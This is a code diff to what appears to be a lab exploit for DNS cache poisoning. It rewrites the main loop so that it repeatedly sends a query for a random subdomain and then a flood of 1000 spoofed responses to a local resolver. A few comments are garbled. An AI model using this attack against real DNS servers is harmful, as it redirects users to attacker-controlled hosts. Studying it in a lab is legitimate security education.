@@ -172,23 +172,25 @@ int main()
   int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);
 
   char a[26] = "abcdefghijklmnopqrstuvwxyz";
+  while (1)
+  {
+    // Generate a random name with length 5
+    char name[6];
+    name[5] = '\0';
+    for (int k = 0; k < 5; k++)
+      name[k] = a[rand() % 26];
 
-  // Generate a random name with length 5
-  char name[6];
-  name[5] = '\0';
-  for (int k = 0; k < 5; k++)
-    name[k] = a[rand() % 26];
+    printf("Sending DNS request and responses for name: %s\n", name);
 
-  printf("Sending DNS request and responses for name: %s\n", name);
+    // Step 1: Send a DNS request to the targeted local DNS server
+    send_dns_request(ip_req, n_req, name);
+    printf("Sent DNS request\n");
 
-  // Step 1: Send a DNS request to the targeted local DNS server
-  send_dns_request(ip_req, n_req, name);
-  printf("Sent DNS request\n");
-
-  // Step 2: Send many spoofed respip_req.bintargeted local DNS server
-  for (int i = 0; i < 1000; i++)
-  { // Send 1000 spoofed respo10.9.0.153
-    send_dns_response(ip_resp, n_resp, name);
+    // Step 2: Send many spoofed respip_req.bintargeted local DNS server
+    for (int i = 0; i < 1000; i++)
+    { // Send 1000 spoofed responses to 10.9.0.153
+      send_dns_response(ip_resp, n_resp, name);
+    }
   }
   fclose(f_req);
   fclose(f_resp);
